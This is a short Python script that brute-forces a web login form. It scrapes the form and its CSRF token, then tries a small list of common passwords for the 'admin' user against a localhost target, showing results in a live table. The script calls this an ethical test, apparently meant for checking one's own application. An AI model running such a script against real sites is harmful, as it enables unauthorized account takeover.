import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time

# ---- Config ----
TARGET_URL = "http://localhost:5000/login"
USERNAME = "admin"
WORDLIST = ["admin", "123456", "password", "admin123", "letmein"]
# ----------------

session = requests.Session()
console = Console()

def get_form_details():
    r = session.get(TARGET_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.find("form")
    inputs = form.find_all("input")

    data = {}
    csrf_field = None

    for input_tag in inputs:
        name = input_tag.get("name")
        value = input_tag.get("value", "")
        if name:
            data[name] = value
        if "csrf" in name.lower():
            csrf_field = name

    return {
        "action": form.get("action"),
        "method": form.get("method", "post").lower(),
        "data": data,
        "csrf": csrf_field
    }

def brute_force():
    table = Table(title="Login Brute-Force Results", expand=True)
    table.add_column("Attempt", justify="right", style="cyan")
    table.add_column("Username")
    table.add_column("Password")
    table.add_column("Status")

    attempt = 1

    with Live(table, refresh_per_second=4):
        for pwd in WORDLIST:
            form = get_form_details()
            login_url = urljoin(TARGET_URL, form["action"])
            data = form["data"]
            data["username"] = USERNAME
            data["password"] = pwd

            r = session.post(login_url, data=data)
            status = "✔️ Success" if "Welcome" in r.text else "❌ Failed"
            table.add_row(str(attempt), USERNAME, pwd, status)
            attempt += 1
            time.sleep(0.3)

    console.print("[green bold]\nFinished! Review results above.[/green bold]")

if __name__ == "__main__":
    console.print(f"[bold yellow]Starting ethical brute-force test on {TARGET_URL}[/bold yellow]")
    brute_force()
